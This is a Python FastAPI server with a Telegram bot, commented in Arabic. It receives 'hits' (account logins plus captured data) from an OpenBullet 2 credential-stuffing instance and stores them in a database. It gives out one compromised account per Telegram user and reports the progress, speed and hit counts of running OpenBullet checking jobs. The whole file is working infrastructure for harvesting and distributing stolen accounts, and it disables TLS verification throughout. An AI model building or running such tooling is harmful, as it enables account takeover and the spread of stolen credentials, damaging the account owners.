from fastapi import FastAPI, Request
import httpx
import os
from sqlalchemy import create_engine, Column, Integer, String, Boolean
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

app = FastAPI()

# ==================== CONFIGURATION ====================
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
ADMIN_IDS = ["123456789"]  # ⚠️ ضع الـ Chat ID الخاص بك هنا لتفعيل لوحة التحكم لك

# إعدادات ربط OpenBullet 2 (Hugging Face Private Space)
OPENBULLET_URL = os.getenv("OPENBULLET_URL")        # مثال: https://hammzz-myopenbullet.hf.space
OPENBULLET_API_KEY = os.getenv("OPENBULLET_API_KEY")  # مفتاح الـ API من R. Settings
HF_TOKEN = os.getenv("HF_TOKEN")                    # الـ Access Token لحسابك (Private Space)

# إعدادات قاعدة بيانات ريندر
DATABASE_URL = os.getenv("DATABASE_URL")
if DATABASE_URL and DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

# ==================== DATABASE CONFIG ====================
engine = create_engine(DATABASE_URL)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()

class Account(Base):
    __tablename__ = "accounts"
    id = Column(Integer, primary_key=True, index=True)
    config_name = Column(String, index=True)
    account_data = Column(String, unique=True, index=True)
    captured_data = Column(String)
    is_given = Column(Boolean, default=False)

class DeliveredAccount(Base):
    __tablename__ = "delivered_accounts"
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(String, unique=True, index=True)

Base.metadata.create_all(bind=engine)

# ==================== CYBER KEYBOARDS (عربي) ====================

# 1. القائمة الرئيسية الثابتة أسفل الشاشة
def get_main_keyboard(is_admin: bool):
    buttons = [
        [{"text": "⚡ 🧬 سحب حساب جديد 🧬 ⚡"}, {"text": "📡 🌐 إحصائيات المخزن 🌐 📡"}],
        [{"text": "🤖 ⚔️ عمليات أوبن بلوت الجارية ⚔️ 🤖"}]
    ]
    if is_admin:
        buttons.append([{"text": "🛠️ 👾 لوحة تحكم المطور 👾 🛠️"}])
        
    return {
        "keyboard": buttons,
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

# 2. الأزرار الشفائية التفاعلية أسفل لوحة تحكم الأدمن
def get_inline_control_buttons():
    return {
        "inline_keyboard": [
            [
                {"text": "🧹 تصفير الموزع", "callback_data": "reset_delivered"},
                {"text": "🚨 تصفير المخزن بالكامل", "callback_data": "clear_accounts"}
            ],
            [
                {"text": "🔄 تحديث بيانات اللوحة", "callback_data": "refresh_admin_stats"}
            ]
        ]
    }

# ==================== ENDPOINTS ====================

@app.get("/")
def read_root():
    return {"status": "Cyber Core Matrix v3.8 is Online & Linked to Private OB2 Space."}

# استقبال الـ Hits القادمة من الأداة وتخزينها
@app.post("/webhook/hit")
async def receive_hit(request: Request):
    db = SessionLocal()
    try:
        data = await request.json()
        config_name = data.get("config") or data.get("configName") or data.get("ConfigName") or "UNKNOWN_MODULE"
        account_data = data.get("data", "NO_DATA")
        captured_data = data.get("captured") or data.get("capturedData") or data.get("variables") or "NO_CAPTURED_DATA"
        
        exists = db.query(Account).filter(Account.account_data == account_data).first()
        if exists:
            return {"status": "ignored", "message": "Account already exists"}
            
        new_account = Account(config_name=config_name, account_data=account_data, captured_data=captured_data, is_given=False)
        db.add(new_account)
        db.commit()
        return {"status": "success"}
    except Exception as e:
        db.rollback()
        return {"status": "error", "message": str(e)}
    finally:
        db.close()

# معالجة البوت والويب هوك الخاص بتليجرام
@app.post("/webhook/telegram")
async def telegram_webhook(request: Request):
    db = SessionLocal()
    try:
        payload = await request.json()
        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"
        
        # --- [أ] Callback Queries (الأزرار الشفافة التفاعلية للأدمن) ---
        if "callback_query" in payload:
            callback_id = payload["callback_query"]["id"]
            chat_id = str(payload["callback_query"]["message"]["chat"]["id"])
            message_id = payload["callback_query"]["message"]["message_id"]
            data = payload["callback_query"]["data"]
            
            if chat_id not in ADMIN_IDS:
                async with httpx.AsyncClient(verify=False) as client:
                    await client.post(f"{telegram_url}/answerCallbackQuery", json={"callback_query_id": callback_id, "text": "❌ ACCESS DENIED: SYSTEM BREACH DETECTED.", "show_alert": True})
                return {"status": "success"}

            async with httpx.AsyncClient(verify=False) as client:
                if data == "reset_delivered":
                    db.query(DeliveredAccount).delete()
                    db.commit()
                    await client.post(f"{telegram_url}/answerCallbackQuery", json={"callback_query_id": callback_id, "text": "🧹 تم تصفير سجل التوزيع! يمكن للجميع سحب حساب جديد الآن.", "show_alert": True})
                
                elif data == "clear_accounts":
                    db.query(Account).delete()
                    db.commit()
                    await client.post(f"{telegram_url}/answerCallbackQuery", json={"callback_query_id": callback_id, "text": "🚨 تم مسح جميع الحسابات من المخزن تماماً.", "show_alert": True})
                
                elif data == "refresh_admin_stats":
                    total_accounts = db.query(Account).count()
                    available_count = db.query(Account).filter(Account.is_given == False).count()
                    delivered_count = db.query(Account).filter(Account.is_given == True).count()
                    
                    updated_text = (
                        f"┌─── 🌌 **「 لوحة تحكم النيون المتقدمة 」** 🌌\n"
                        f"│\n"
                        f"├── 🟣 **إجمالي الحسابات بالسيستم:** `{total_accounts}`\n"
                        f"├── 🟢 **الحسابات الجاهزة للتسليم:** `{available_count}`\n"
                        f"└── 🔴 **الحسابات التي تم توزيعها:** `{delivered_count}`\n"
                        f"│\n"
                        f"└────────────── [ تحديث مباشر للشبكة ] 🖥️"
                    )
                    await client.post(f"{telegram_url}/editMessageText", json={"chat_id": chat_id, "message_id": message_id, "text": updated_text, "reply_markup": get_inline_control_buttons(), "parse_mode": "Markdown"})
            return {"status": "success"}

        # --- [ب] معالجة الرسائل وضغطات الأزرار الثابتة المعربة ---
        if "message" not in payload or "text" not in payload["message"]:
            return {"status": "ignored"}
            
        chat_id = str(payload["message"]["chat"]["id"])
        user_text = payload["message"]["text"].strip()
        is_admin = chat_id in ADMIN_IDS
        
        # أمر الترحيب السيبراني الأول
        if user_text == "/start":
            welcome_text = (
                f"🌌 **WELCOME TO THE CYBERPUNK DISTRIBUTOR CORE** 🌌\n\n"
                f"⚡ `الحالة: متصل بالشبكة الآمنة`\n"
                f"🎛️ `الواجهة: ثيم النيون الليلي v3.8`\n\n"
                f"🤖 _استخدم الأزرار المعرّبة بالأسفل للتحكم بالنظام، أو سحب حسابك، أو مراقبة خادم أوبن بلوت..._"
            )
            await httpx.AsyncClient(verify=False).post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": welcome_text, "reply_markup": get_main_keyboard(is_admin), "parse_mode": "Markdown"})
                
        # زر إحصائيات المخزن الحالي
        elif user_text == "📡 🌐 إحصائيات المخزن 🌐 📡" or user_text == "/stats":
            available_count = db.query(Account).filter(Account.is_given == False).count()
            reply_text = (
                f"┌─── 📡 **「 مستودع البيانات المشفرة 」** 📡\n"
                f"│\n"
                f"└── 🟢 **الحسابات المتوفرة بالمخزن حالياً:** `{available_count}` حساب\n"
                f"│\n"
                f"└───────────── [ مصفوفة حية ] ⚡"
            )
            await httpx.AsyncClient(verify=False).post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": reply_text, "parse_mode": "Markdown"})
                
        # زر التوزيع العادل (حساب واحد لكل مستخدم)
        elif user_text == "⚡ 🧬 سحب حساب جديد 🧬 ⚡" or user_text == "/get":
            already_received = db.query(DeliveredAccount).filter(DeliveredAccount.user_id == chat_id).first()
            
            if already_received:
                reply_text = "🚨 **SYSTEM DENIAL:** `جدار الحماية نشط` 🚨\n\n❌ عذراً! لقد قمت بسحب حساب سابقاً. النظام يسمح بـ **حساب واحد فقط لكل مستخدم** لضمان فرص متكافئة للجميع."
            else:
                available_account = db.query(Account).filter(Account.is_given == False).first()
                
                if not available_account:
                    reply_text = "🚨 **MAINFRAME ERROR:** `المستودع فارغ` 🚨\n\n😔 لا توجد أي حسابات متوفرة في قاعدة البيانات حالياً، انتظر حتى يتم الصيد والضخ التلقائي."
                else:
                    available_account.is_given = True
                    db.add(DeliveredAccount(user_id=chat_id))
                    db.commit()
                    
                    reply_text = (
                        f"🌌 **⚡ 「 تم اختراق المصفوفة وسحب الحساب بنجاح 」 ⚡** 🌌\n\n"
                        f"📦 **النوع / Config:**\n`{available_account.config_name}`\n\n"
                        f"👤 **بيانات الحساب / Account:**\n`{available_account.account_data}`\n\n"
                        f"⚙️ **البيانات المستخرجة / Captured:**\n`{available_account.captured_data}`\n\n"
                        f"🔒 _STATUS: TERMINAL LOCKED - اضغط على النص لنسخه مباشرة_"
                    )
            await httpx.AsyncClient(verify=False).post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": reply_text, "parse_mode": "Markdown"})

        # زر مراقبة خادم أوبن بلوت السري المشفر (يدعم الـ Private Spaces)
        elif user_text == "🤖 ⚔️ عمليات أوبن بلوت الجارية ⚔️ 🤖":
            if not OPENBULLET_URL or not OPENBULLET_API_KEY:
                reply_text = "❌ **خطأ بالاتصال:** إعدادات متغيرات البيئة لـ OpenBullet API غير مكتملة على ريندر."
            else:
                ob_api_url = f"{OPENBULLET_URL}/api/v1/jobs"
                headers = {"Authorization": f"Bearer {OPENBULLET_API_KEY}"}
                
                # تخطي جدار حماية Hugging Face إذا كان التطبيق بريفيت
                if HF_TOKEN:
                    headers["X-Hf-Token"] = HF_TOKEN

                try:
                    async with httpx.AsyncClient(verify=False, timeout=6.0) as client:
                        response = await client.get(ob_api_url, headers=headers)
                        
                    if response.status_code == 200:
                        jobs_data = response.json()
                        running_jobs = [j for j in jobs_data if j.get("status") in ["Running", "Active"]]
                        
                        if not running_jobs:
                            reply_text = "💤 **حالة الـ Mainframe:** `خامل (IDLE)`\n\n🟢 لا توجد أي عمليات فحص (Jobs) جارية حالياً على خادم OpenBullet."
                        else:
                            reply_text = f"⚙️ **「 شاشة مراقبة OPENBULLET التلقائية 」** ⚙️\n\n"
                            reply_text += f"⚡ **العمليات النشطة:** `{len(running_jobs)}` عملية فحص جارية\n"
                            reply_text += "────────────────────\n"
                            
                            for job in running_jobs:
                                reply_text += (
                                    f"📦 **العملية (Job):** `{job.get('name', 'Unknown')}`\n"
                                    f"📊 **نسبة التقدم:** `{job.get('progress', 0):.1f}%`\n"
                                    f"⚡ **السرعة الإجمالية (CPM):** `{job.get('cpm', 0)}`\n"
                                    f"🎯 **الـ Hits المحصودة:** `{job.get('hits', 0)}`\n"
                                    f"📡 `الحالة: جاري الفحص وسحب الحسابات...`\n"
                                    f"────────────────────\n"
                                )
                    else:
                        reply_text = f"❌ **فشل التصريح:** رفض خادم Hugging Face الاتصال بالـ API. رمز الخطأ: `{response.status_code}`"
                except Exception as ex:
                    reply_text = f"🚨 **خطأ بالاتصال:** لا يمكن الوصول إلى خادم الـ Private Space.\n`تفاصيل: {str(ex)}`"
            
            await httpx.AsyncClient(verify=False).post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": reply_text, "parse_mode": "Markdown"})

        # زر لوحة تحكم المطور الفاخرة للأدمن المعربة
        elif user_text == "🛠️ 👾 لوحة تحكم المطور 👾 🛠️" and is_admin:
            total_accounts = db.query(Account).count()
            available_count = db.query(Account).filter(Account.is_given == False).count()
            delivered_count = db.query(Account).filter(Account.is_given == True).count()
            
            admin_text = (
                f"┌─── 🌌 **「 لوحة تحكم النيون المتقدمة 」** 🌌\n"
                f"│\n"
                f"├── 🟣 **إجمالي الحسابات بالسيستم:** `{total_accounts}`\n"
                f"├── 🟢 **الحسابات الجاهزة للتسليم:** `{available_count}`\n"
                f"└── 🔴 **الحسابات التي تم توزيعها:** `{delivered_count}`\n"
                f"│\n"
                f"└────────────── [ أوامر النظام التفاعلية ] 👇"
            )
            await httpx.AsyncClient(verify=False).post(f"{telegram_url}/sendMessage", json={"chat_id": chat_id, "text": admin_text, "reply_markup": get_inline_control_buttons(), "parse_mode": "Markdown"})

        return {"status": "success"}
    except Exception as e:
        db.rollback()
        print(f"Telegram Webhook Error: {str(e)}")
        return {"status": "error"}
    finally:
        db.close()
